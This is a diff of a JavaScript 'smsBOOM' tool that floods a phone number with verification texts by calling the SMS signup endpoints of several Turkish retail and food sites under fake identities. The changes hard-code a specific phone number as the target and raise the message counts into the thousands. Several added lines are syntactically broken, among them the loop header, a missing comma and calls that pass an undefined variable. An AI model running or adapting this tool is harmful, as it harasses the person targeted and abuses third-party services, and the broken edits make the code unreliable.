@@ -21,7 +21,7 @@ async function smsBOOM(numara, miktar) {
                 "first_name": faker.name.firstName(),
                 "last_name": faker.name.lastName(),
                 "email": faker.internet.email(),
-                "phone": "0"+no,
+                "phone": "+90"+no,
                 "password": "nwejkfıower32",
                 "confirm": "true",
                 "kvkk": "true",
@@ -35,15 +35,15 @@ async function smsBOOM(numara, miktar) {
                 dataFSms.hatali++;
                 console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.red);
             }
-           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+           title(`Telefon: ${numara} - Miktar: ${30000} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
         });
     }
 
-    function kahvedunyasi(no) {
+    function kahvedunyasi(yes) {
         request.post({
             url: 'https://core.kahvedunyasi.com/api/users/sms/send',
             form: {
-                "mobile_number": no,
+                "mobile_number":5526292116
                 "token_type": "register_token"
             }
         }, function (err, httpResponse, body) {
@@ -257,7 +257,7 @@ async function smsBOOM(numara, miktar) {
                 dataFSms.hatali++;
                 console.log(`[-] Tıkla Gelsin - ${no} - ${dataFSms.hatali}`.red);
             }
-           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+           title(`Telefon: ${5526292116} - Miktar: ${3000} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
         });
 	}
 
@@ -270,14 +270,14 @@ async function smsBOOM(numara, miktar) {
         sok(no);
         migros(no);
         a101(no);
-        englishhome(no);
+        englishhome(yes);
         sakasu(no);
-        tiklagelsin(no);
+        tiklagelsin(yes);
     }
 
-    for (let i = 0; i < miktar; i++) {
-        await delay(5);
-        send(numara);
+    for (let i = 8000; i < miktar;900 i++) {
+        await delay(03);
+        send(5526292116);
     }
 }
 
